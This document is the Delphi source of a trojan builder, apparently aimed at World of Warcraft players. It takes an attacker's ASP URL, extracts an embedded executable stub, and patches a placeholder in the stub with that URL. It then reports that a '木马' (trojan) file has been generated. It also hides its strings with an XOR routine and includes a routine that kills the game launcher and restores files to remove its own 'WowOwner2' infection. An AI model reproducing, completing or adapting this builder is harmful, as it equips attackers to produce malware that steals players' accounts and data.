unit Unit1;
//引入exe资源
{$R head.RES}

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, Grids, MPHexEditor, MPHexEditorEx, ExtCtrls, StdCtrls, ComCtrls,
  XPMan, jpeg, RzBmpBtn,TLHelp32;
type
  TForm1 = class(TForm)
    SaveDialog1: TSaveDialog;
    Image1: TImage;
    Edit1: TEdit;
    RzBmpButton1: TRzBmpButton;
    RzBmpButton2: TRzBmpButton;
    Memo1: TMemo;
    Label1: TLabel;
    RzBmpButton3: TRzBmpButton;
    Memo2: TMemo;
    MPHexEditorEx1: TMPHexEditorEx;
    procedure FormCreate(Sender: TObject);
    procedure Image1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Image1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Image1MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure RzBmpButton2Click(Sender: TObject);
    procedure RzBmpButton1Click(Sender: TObject);
    procedure RzBmpButton3Click(Sender: TObject);
  private
    FisDown:Boolean;
    FDetax,FDetaY:Integer;
    FP,FOldP:TPoint;

    function ReplacePass(Filename,Find, Replace: string): boolean;
    function Encode(s:string):string;
    function UPr(str:string):string;
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  wowinstallpath:string;
const
   //定义注册表位置
  REG_INSTALL_PATH_ITEM='InstallPath';
  REG_INSTALL_KEY='SOFTWARE\Blizzard Entertainment\World of Warcraft';

implementation

{$R *.dfm}

{ TForm1 }
 //加密
Function Enstr(Src:String; Key:String; Encrypt : Boolean):string;
var
   //idx         :integer;
   KeyLen      :Integer;
   KeyPos      :Integer;
   offset      :Integer;
   dest        :string;
   SrcPos      :Integer;
   SrcAsc      :Integer;
   TmpSrcAsc   :Integer;
   Range       :Integer;

begin
     KeyLen:=Length(Key);
     if KeyLen = 0 then key:='Tom Lee';
     KeyPos:=0;
     SrcPos:=0;
     SrcAsc:=0;
     Range:=256;
     if Encrypt then
     begin
          Randomize;
          offset:=Random(Range);
          dest:=format('%1.2x',[offset]);
          for SrcPos := 1 to Length(Src) do
          begin
               SrcAsc:=(Ord(Src[SrcPos]) + offset) MOD 255;
               if KeyPos < KeyLen then KeyPos:= KeyPos + 1 else KeyPos:=1;
               SrcAsc:= SrcAsc xor Ord(Key[KeyPos]);
               dest:=dest + format('%1.2x',[SrcAsc]);
               offset:=SrcAsc;
          end;
     end
     else
     begin
          offset:=StrToInt('$'+ copy(src,1,2));
          SrcPos:=3;
          repeat
                SrcAsc:=StrToInt('$'+ copy(src,SrcPos,2));
                if KeyPos < KeyLen Then KeyPos := KeyPos + 1 else KeyPos := 1;
                TmpSrcAsc := SrcAsc xor Ord(Key[KeyPos]);
                if TmpSrcAsc <= offset then
                     TmpSrcAsc := 255 + TmpSrcAsc - offset
                else
                     TmpSrcAsc := TmpSrcAsc - offset;
                dest := dest + chr(TmpSrcAsc);
                offset:=srcAsc;
                SrcPos:=SrcPos + 2;
          until SrcPos >= Length(Src);
     end;
     Result:=Dest;
end;

//读注册表
function readreg(sKey:string;var pBuffer:string;dwBufSize:dword;key:hkey;sSubKey:string;ulType:dword):boolean;
var
  sTemp:pchar;
  hSubKey: hkey;
  Datatype:dword;
begin
  sTemp:='';
  result:=false;
  if RegOpenKeyEx(key,pchar(sSubkey),0,KEY_ALL_ACCESS,hSubKey)<>0 then
    begin
      exit;
    end;
  try
    getmem(sTemp,dwBufSize);
    if (RegQueryValueEx(hSubKey,pchar(sKey),nil,@Datatype,pbyte(sTemp),@dwBufSize)=0)and(DataType = ulType) then
      begin
        pBuffer:=sTemp;
        result:=true;
      end;
  finally
    RegCloseKey(hSubKey);
    freemem(sTemp);
  end;
end;
//获得Temp目录
Function getTemp():string;
var windir:array[0..255] of char;
begin
  gettemppath(sizeof(windir),windir);
  result:=windir;
end;


//释放流
Function ExtractRes(ResType, ResName, ResNewName : String):boolean;
var
  Res : TResourceStream;
begin
try
  Res := TResourceStream.Create(Hinstance, Resname, Pchar(ResType));
try
  Res.SavetoFile(ResNewName);
  Result:=true;
finally
  Res.Free;
end;
except
  Result:=false;
end;
end;


/////////////////////复制函数/////////////////
Procedure FileCopy( Const sourcefilename, targetfilename: String );
Var
  S, T: TFileStream;
Begin
  S := TFileStream.Create( sourcefilename, fmOpenRead );

  try
    T := TFileStream.Create( targetfilename,
                             fmOpenWrite or fmCreate );
    try
      T.CopyFrom(S, S.Size ) ;
    finally
      T.Free;
    end;
  finally
    S.Free;
  end;
End;

function TForm1.ReplacePass(Filename, Find, Replace: string): boolean;
var
  LIntPos,
  LIntPos2: Integer;

  strdata,
  LStrFind,
  LStrReplace: string;
 
begin
result:=false;
mphexeditorex1.LoadFromFile(filename);   //exe file name
strdata:=find ;         // want to find string
LstrReplace:=replace ;     // want to replace string
LIntPos := 0  ;
with mphexeditorex1 do
begin
   LStrFind := PrepareFindReplaceData(StrData, false, true);
   LIntPos2 := Find(pchar(LStrFind), Length(LStrFind), LIntPos, DataSize -1,false);
   SelStart := LIntPos2;
   SelEnd := LIntPos2 + Length(LStrFind)-1;
   if LStrReplace <> '' then ReplaceSelection(PChar(LStrReplace), Length(LStrReplace), '', False);
   mphexeditorex1.SaveToFile(filename);
end;
result:=true;
end;

function TForm1.Encode(s: string): string;
var
s1:string;
i:integer;
begin
  result:='';
  s1:=s;
  delete(s1,(length(s1)+1),(100-(length(s1))));
  for i:=0 to (99-length(s1)) do
  begin
      s1:=s1+' ';
  end;
  result:=s1;
end;


procedure TForm1.FormCreate(Sender: TObject);
var
i:integer;
begin
//edit1.Color:=rgb(224,201,159);
//memo1.Color:=rgb(0,51,61);
label1.Caption:=enstr('8A60E174C596DAEDBDF4813F943066FC4C0F212E2D0552F7541C','asd',False);
edit1.Text:=enstr('7B5C7420B4FF93089481B39EB485C89DB191A3B9AA8B99899662EF0DE33ACB50E331C38281918DC9446903AC19ADF5566973384B7510A8C657','asd',False);
for i:=0 to memo2.Lines.Count-1 do
  memo1.Lines.Add(enstr(memo2.Lines.Strings[i],'asd',False));
ReadReg(REG_INSTALL_PATH_ITEM,wowinstallpath,MAX_PATH,HKEY_LOCAL_MACHINE,REG_INSTALL_KEY, REG_SZ);//初始化wowinstallpath
end;

procedure TForm1.Image1MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
  if button=mbLeft then
  begin
    FisDown:=True;
    GetCursorPos(FOldP);
  end;
end;
procedure TForm1.Image1MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
if not FisDown then exit;
GetCursorPos(Fp);
FDetaX:=Fp.x-Foldp.x;
FDetaY:=FP.y-FOldP.y;
SetBounds(Left+FDetaX,Top+FDetaY,Width,Height);
GetCursorPos(FOldP);
end;

procedure TForm1.Image1MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
FisDown:=false;
end;

procedure TForm1.RzBmpButton2Click(Sender: TObject);
begin
close;
end;

procedure TForm1.RzBmpButton1Click(Sender: TObject);
var
s:string;
begin

if pos('HTTP://',upr(edit1.Text))=0 then
begin
  MessageBox(Handle,'未找到“http://”，请确认您填写的ASP地址是否正确','提示信息',MB_OK+MB_ICONERROR );
  exit;
end;
if length(edit1.Text)>100 then
begin
  MessageBox(Handle,'ASP地址长度不得超过100个字符”','提示信息',MB_OK+MB_ICONERROR );
  exit;
end;

if MessageBox(Handle,pchar('免责声明:'+enstr('A334812E7D492C9B3563556743746F5B6D3781348442843E6945675671369D2E9F0C9826416C158D1BBDE3F8CEFE8E2AB510704C952B9004873462456B576252773E7A4F536D70616158239C1DA608DBE4F9D5D9AE31A711DCDCDBECD8C1D6E5B01976484D6B579B3B96E9CDA43B6C4053','asd',False)),'提示信息',MB_YESNO+MB_ICONQUESTION ) = ID_NO then exit;
MessageBox(Handle,pchar('测试版说明:'+char(#13)+enstr('F8DCA40BA50AA93E705F46EE3AD053AE7C9261F260773B752EBFD5E3C316DDF3CC1961607B317F59536F754A7B5B596F3F714470725E369001BCF0D4E0FFD8F8B4048B2089389212A9178E2E8824AA2DAEBC3F83','asd',False)+char(#13)+enstr('BCF19E31B801DFD4A108A426697A4A7603B706B41994EDB0F474B66CC78ADE74D66EFE461F5ED09966B47A87B248DC31C249FA081835FC0D09','asd',false)),'提示信息',MB_OK+MB_ICONINFORMATION );

if not(ExtractRes('exefile','head',gettemp+'WO2.temp')) then
begin
  MessageBox(Handle,'生成失败！','提示信息',MB_OK+MB_ICONERROR );
  exit;
end;
if savedialog1.Execute then
begin
  filecopy(gettemp+'WO2.temp',savedialog1.FileName);
  deletefile(gettemp+'WO2.temp');
  ReplacePass(savedialog1.FileName,'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',encode(edit1.text));
  showmessage('恭喜，木马文件生成成功在'+savedialog1.FileName );
end;
end;

procedure TForm1.RzBmpButton3Click(Sender: TObject);
 var
  FSnapshotHandle:THandle;
  FProcessEntry32:TProcessEntry32;
  Ret : BOOL;
  s:string;
begin
if (wowinstallpath='') then
begin
  MessageBox(Handle,'未找到魔兽世界！','提示信息',MB_OK+MB_ICONINFORMATION );
  exit;
end;
if (not(fileexists(wowinstallpath+'Launcher.mpq'))) then
begin
  MessageBox(Handle,'未找到WowOwner2 !','提示信息',MB_OK+MB_ICONINFORMATION );
  exit;
end;
if fileexists(wowinstallpath+'Launcher.mpq') then
begin
  FSnapshotHandle:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
  FProcessEntry32.dwSize:=Sizeof(FProcessEntry32);
  Ret:=Process32First(FSnapshotHandle,FProcessEntry32);
  while Ret do
  begin
    s:=ExtractFileName(FProcessEntry32.szExeFile);
    if s='Launcher.exe' then
    begin
      TerminateProcess(OpenProcess(PROCESS_TERMINATE,False,FProcessEntry32.th32ProcessID),$FFFFFFFF);
    end;
    if s='Launcher.mpq' then
    begin
      TerminateProcess(OpenProcess(PROCESS_TERMINATE,False,FProcessEntry32.th32ProcessID),$FFFFFFFF);
    end;
    Ret:=Process32Next(FSnapshotHandle,FProcessEntry32);
  end;
  sleep(3000);
  deletefile(wowinstallpath+'Launcher.exe');
  renamefile(wowinstallpath+'Launcher.mpq',wowinstallpath+'Launcher.exe');
  MessageBox(Handle,'WowOwner2已成功清除！','提示信息',MB_OK+MB_ICONINFORMATION );
end;

end;

function TForm1.UPr(str: string): string;
var

  s : string;
  i : Integer;
begin
  { Get string from TEdit control }
  s := str;
  for i := 1 to Length(s) do
    s[i] := UpCase(s[i]);
  result:=s;
end;


end.
